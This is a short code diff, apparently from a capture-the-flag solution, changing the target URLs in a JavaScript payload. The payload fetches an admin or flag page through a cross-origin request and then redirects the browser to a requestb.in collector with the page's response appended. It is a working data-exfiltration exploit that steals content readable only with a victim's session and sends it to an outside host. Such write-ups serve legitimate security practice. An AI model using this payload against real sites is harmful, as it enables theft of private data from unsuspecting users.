@@ -12,12 +12,12 @@
 // Make the actual CORS request.
 function makeCorsRequest() {
   // This is a sample server that supports CORS.
-  var url = 'http://de2e4dff304af27080e140d7b9cf857a054f7288.ctf.site:20000/admin';
+  var url = 'http://showtheadmin.bitsctf.bits-quark.org/secret/flag.php';
   var xhr = createCORSRequest('GET', url);
   // Response handlers.
   xhr.onload = function() {
     var text = xhr.responseText;
-    document.location = 'http://requestb.in/15rrpyd1?code='+ text;
+    document.location = 'http://requestb.in/14tl3qr1?code='+ text;
   };
   xhr.send();
 }
